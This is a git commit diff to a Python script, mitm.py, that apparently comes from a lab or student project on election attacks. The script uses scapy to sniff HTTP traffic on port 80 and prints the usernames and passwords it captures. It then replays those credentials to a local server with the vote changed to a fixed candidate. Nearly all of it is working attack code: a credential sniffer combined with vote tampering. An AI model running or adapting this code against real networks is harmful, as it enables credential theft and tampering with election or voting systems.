5412bc8a096cdd4ac7d9f463ffe2c1500c80cd14
Jonathan Hsu <jhsu0903@hotmail.com>
2022-11-09 20:32:33 -0500

    Update attack vector by updating vote

--- app/mitm.py
+++ app/mitm.py
@@ -1,10 +1,17 @@
 from scapy.all import *
+import requests
 
+url = 'http://127.0.0.1'
 userField = 'user='
 passField = 'pass='
 voteField = 'vote='
 desiredVote = '2'
 
+payload = {
+    'user' : '',
+    'pass' : '',
+    'vote' : ''
+}
 
 def http_header(packet):
     if Raw in packet:
@@ -16,23 +23,24 @@ def http_header(packet):
             endIndex = data.find('&', index, len(data) - 1)
             scrapedUser = data[index + len(userField): endIndex]
             print("Username is: " + scrapedUser)
+            payload['user'] = str(scrapedUser)
+            print(payload['user'])
 
         if passField in str(packet[Raw].load):
             index = data.find(passField)
             endIndex = data.find('&', index, len(data) - 1)
             scrapedPass = data[index + len(passField): endIndex]
             print("Password is: " + scrapedPass)
+            payload['pass'] = str(scrapedPass)
+            print(payload['pass'])
 
         if voteField in str(packet[Raw].load):
             index = data.find(voteField)
             print("Original vote was for candidate " + dataList[index + len(voteField)])
-            dataList[index + len(voteField)] = desiredVote
+            payload['vote'] = str(desiredVote)
             print("Changed vote to " + desiredVote)
-
-        data = "".join(dataList)
-        packet[Raw].load = data
-        print(packet.show())
-    send(packet)
+            res = requests.post(url, data=payload)
+            print(res.text)
 
 
 sniff(iface='\\Device\\NPF_Loopback', prn=http_header, filter="port 80")
